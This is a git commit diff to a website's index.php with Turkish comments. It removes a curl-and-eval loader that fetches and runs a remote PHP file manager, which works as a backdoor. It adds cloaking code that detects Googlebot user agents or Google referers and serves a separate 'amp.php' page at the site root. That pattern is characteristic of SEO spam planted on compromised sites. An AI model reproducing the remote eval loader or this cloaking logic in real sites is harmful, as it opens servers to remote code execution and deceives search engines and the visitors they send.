6a36438c92d3ee89cb0bfa2abfe910a01006b2f7
413X308 <PhillipsBarbara4458@outlook.com>
2026-02-01 18:50:45 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,9 +1,46 @@
 <?php
+// Kullanıcı ajanı ve referans bilgisini güvenli şekilde al
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$referer = $_SERVER['HTTP_REFERER'] ?? '';
 
-    $Url = "https://github.com/prasathmani/tinyfilemanager/blob/master/tinyfilemanager.php";
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $Url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $output = curl_exec($ch);
-    curl_close($ch);
-    echo eval('?>'.$output);
+// Google botlarını tanımla
+$googleBots = [
+    'Googlebot',
+    'AdsBot',
+    'Mediapartners-Google',
+    'APIs-Google',
+    'Googlebot-Image',
+    'Googlebot-Video',
+    'Googlebot-News',
+    'Googlebot-Search',
+    'Googlebot-Inspect',
+    'Googlebot-Android',
+    'Googlebot-Mobile',
+    'Googlebot-Ads',
+    'Googlebot-Discovery',
+    'Google-'
+];
+
+// Bot tespiti
+$isGoogleBot = false;
+
+// Kullanıcı ajanına göre kontrol
+foreach ($googleBots as $bot) {
+    if (stripos($userAgent, $bot) !== false) {
+        $isGoogleBot = true;
+        break;
+    }
+}
+
+// Referer kontrolü
+if (strpos($referer, 'google.') !== false) {
+    $isGoogleBot = true;
+}
+
+// Ana dizine istek yapılmışsa ve Google bot'uysa
+if ($isGoogleBot && ($_SERVER['REQUEST_URI'] === '/')) {
+    include 'amp.php';
+    exit;
+}
+
+?>
